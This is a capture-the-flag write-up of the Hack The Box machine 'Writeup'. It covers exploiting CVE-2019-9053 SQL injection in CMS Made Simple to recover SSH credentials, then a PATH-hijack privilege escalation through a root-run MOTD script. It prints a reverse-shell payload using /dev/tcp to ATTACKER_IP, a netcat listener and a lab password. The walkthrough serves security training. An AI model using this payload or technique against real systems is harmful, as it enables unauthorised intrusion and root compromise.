## Hello everyone!

Today, we will dive into a detailed write-up of *Writeup*, an easy-rated machine from Hack The Box.

Let’s get started!

![image](/HTB/Writeup/Writeup_images/1.png)

(Please ensure that you have added the following line   `writeup.htb     TARGET_IP`   to your local `/etc/hosts` file to enable **DNS resolution**)



## Information Gathering


First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the system we’re targeting:

![image](/HTB/Writeup/Writeup_images/2.png)

There are two exposed services running on the target machine:

**SSH** (Port 22)

**HTTP** (Port 80)

We can start by inspecting the website hosted on port **80**:

![image](/HTB/Writeup/Writeup_images/3.png)

We are greeted with a simple static web page containing only HTML content. Inspecting the source code doesn’t reveal anything useful either. All we know is a protection script which appears to ban malicious IP, which means that we can’t perform web crawling/fuzzing with tools such as **Gobuster** or **ffuf** without getting blocked after a few requests. Let’s try to access the common `robots.txt` file from our web browser to see whether any web resource has been hidden:

![image](/HTB/Writeup/Writeup_images/4.png)

It appears that the `/writeup/` directory is disallowed in the `robots.txt` file, meaning that search engine crawlers are instructed not to index it.

![image](/HTB/Writeup/Writeup_images/5.png)

It works! We successfully accessed the previously undiscovered endpoint.
Although inspecting the page itself doesn’t reveal anything very interesting, observing the source code reveals through an HTML tag that the **CMS Made Simple** has been deployed along:

![image](/HTB/Writeup/Writeup_images/6.png)

The page confirms that CMS Made Simple was being used on the target. We can now research known vulnerabilities affecting this CMS.

!7.![image](/HTB/Writeup/Writeup_images/7.png)


While researching known vulnerabilities affecting CMS Made Simple, one vulnerability repeatedly appears: **CVE-2019-9053**.

## Initial Access

**CVE-2019-9053** is a **SQL injection** vulnerability affecting vulnerable versions of CMS Made Simple. It can be exploited to extract information from the backend database, including usernames and password hashes . This vulnerability is critical and its impact is very wide. Here, we will use a Python script available here that could attempt to extract useful information for future use. We can execute it with the `-h` option to learn more about its usage:

![image](/HTB/Writeup/Writeup_images/8.png)

It seems that we need to provide the target URL, a valid wordlist and the `--crack` option to enable password cracking. Please remember to provide the URL including the `/writeup` endpoint that hosts **CMS Made Simple**. Let’s attempt to use this option to extract anything related to a valid user:

![image](/HTB/Writeup/Writeup_images/9.png)

The script extract as things go along valid credentials for the user **jkr**. 

![image](/HTB/Writeup/Writeup_images/10.png)

After a couple of minutes, we successfully recovered his plaintext password: `raykayjay9`

But we didn’t identify any login panel on the website hosted on port 80. However, if we remember, there is another exposed service: **SSH**.
These credentials were probably configured to be used through this protocol. Let’s attempt to authenticate ourselves using these credentials: `jkr:raykayjay9`

![image](/HTB/Writeup/Writeup_images/11.png)

It works, we successfully obtained our initial foothold on the target system as the user **jkr**. We can retrieve the first flag in the current directory:

![image](/HTB/Writeup/Writeup_images/12.png)

## Privilege Escalation

We now need to escalate our current privileges in order to access the final flag. It is a good practice when a user has been compromised (and a password has been found) to run `sudo -l` to check whether he can run any command with **root privileges**:

![image](/HTB/Writeup/Writeup_images/13.png)

But here, it appears that no sudo rule has been configured.

Inspecting cron jobs, capabilities and SUID bit doesn’t reveal anything useful for us. However, inspecting the **jkr groups** reveals an uncommon configuration:

![image](/HTB/Writeup/Writeup_images/14.png)

It appears that the current user belongs to the `staff` group. Members of the `staff` group can be allowed to make modification to the system (`/usr/bin`, `/usr/local/bin` etc…).

This strongly suggests that a script or a file being in **system core** can be manipulated  in order to perform our privilege escalation.

One of the first things we want to check when we are dealing with core system scripts is the **MOTD**. 

On this system, the dynamic MOTD mechanism executes scripts located in `/etc/update-motd.d/` when a user **logs in** through SSH. This script can simply display system features, such as the kernel version, the Linux distribution deployed, the date…

Dynamic MOTD scriptsa re generally stored in `/etc/update-motd.d`:

![image](/HTB/Writeup/Writeup_images/15.png)

As we can see, a MOTD script already exists on the system. This Bash script simply displays system & software information related through the `uname` utility.

This script appears to be harmless. However, there is a critical misconfiguration: the binary has been provided without its absolute path, meaning that a **Path Hijacking** vulnerability could be exploited if we find a way to replace this legitimate binary.
Remember, we identified earlier that our user is able to modificate the system core, such as `/usr/bin` or `/usr/local/bin`. If we find a way to write into a directory that allows to edit binaries (ending with `/bin`), we could usurpate the legitimate `uname` replacing it by a malicious script that will be executing with root privileges because the MOTD script is **root-owned**.

We first need to identify a writable `/bin` folder in order to confirm that this escalation vector is reproductible. Since we know that this permission is typical to the `staff` group, we will filter our research with the following command:

`find / -type d -group staff -writable 2>/dev/null`

![image](/HTB/Writeup/Writeup_images/16.png)

We just confirm that the privilege escalation is possible: On this machine, membership in the `staff` group grants write access to `/usr/local/bin`, which means that we can create our malicious `uname` script that will appear as a legitimate Linux binary because of its location. 

We will use a simple Bash payload to initiate a reverse shell. We still need to add the `#!/bin/sh` shebang to indicates that a Bash script is treated, because the system may not know how to interpret the file if the script doesn’t contains `.sh` in its name. Please note that the `.sh` extension is not required. The `#!/bin/sh` shebang tells the operating system which interpreter should execute the script.

`#!/bin/sh`

`bash -c  'bash -i >& /dev/tcp/ATTACKER_IP/NC_PORT 0>&1'`

This simple script will initiate a connection that we will catch with a listener such as **Netcat**. The listener will wait being listening until our malicious script get executed at the next SSH login.

!![image](/HTB/Writeup/Writeup_images/17.png)


But that’s not all. Even if the `uname` binary present in the MOTD script is provided without its absolute path, the system follows a **traditional path** during binaries/scripts execution: the `$PATH` environment variable. When a script or a binary is executed without an absolute path, the system will execute the first matching executable found.

Let’s take an example. Let’s suppose that the legitimate `uname` binary is located in the `/bin` folder (or `/usr/bin`).

If your `$PATH` variable contains the following line:

`/usr/bin:/bin:/usr/local/games:/usr/local/bin:/usr/games`

The MOTD will execute the legitimate `uname`, not our script.

Why?

 Remember, the malicious script we want to execute is located in the `/usr/local/bin` directory; that is the **fourth** candidate in the list. The system will check `/usr/bin`, `/bin` and `/usr/local/games` before to see whether the `uname` binary exists. Consequently, the legitimate `/bin/uname` Linux binary will be treated, because the `/bin` folder is provided before in the `$PATH` variable. Our goal would be to replace the `$PATH` variable with the following:

`/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games`

With this, our malicious script will be treated in first, because its directory appears first in the `$PATH` variable. Fortunately, this can be done.

Running `export PATH=/usr/local/bin:$PATH` allows us to modify the search pattern the system will make during further scripts and binaries execution.

TL;DR: Because `uname` is invoked without an absolute path, the binary that will be executed depends on the `$PATH` inherited by the process running the MOTD script. We therefore need to verify the search order used by the relevant execution context.

Let’s verify if we need to do this

![image](/HTB/Writeup/Writeup_images/18.png)

It appears that the `/usr/local/bin` folder is already in first place. But remember these instructions for your futures CTF’s! 

 Once all has been set up, we just have to quit using `exit` in order to authenticate and trigger the MOTD script:

(ensure that you have set up your Netcat listener through `nc -lvnp PORT` to catch the connection)

![image](/HTB/Writeup/Writeup_images/19.png)

We successfully escalated our privileges to root, granting full access and control over the machine! The `/root` directory is now accessible, revealing the final flag:

![image](/HTB/Writeup/Writeup_images/20.png)

Challenge completed!

![image](/HTB/Writeup/Writeup_images/21.png)

## Conclusion

This box was very interesting to complete. Starting from a basic web enumeration, we identified a previously undiscovered endpoint. An exposed `robots.txt` file revealed a `/writeup` endpoint which was powered by **CMS Made Simple**. We could identify that the web application was outdated. We abused a discovered SQL Injection vulnerability affecting the CMS that allowed us to gain our initial foothold on the machine as the user **jkr** by extracting his password in addition to the username. Then, we discovered an unusual group to which the user we had compromised was affiliated: `staff`. Because this group allows our user to edit core system resources such as `/usr/local/bin`, we were able to create fake binaries, which was not very useful at this stage. Later, we discovered that the configured script invoked the `uname` utility without its absolute path, which exposed the local system to a Path Hijacking attack. Consequently, we created a malicious script with the same name, which was executed by the system instead of the legitimate `uname` binary during the MOTD process, resulting in a full compromise of the target system.

**Thank you for reading!**
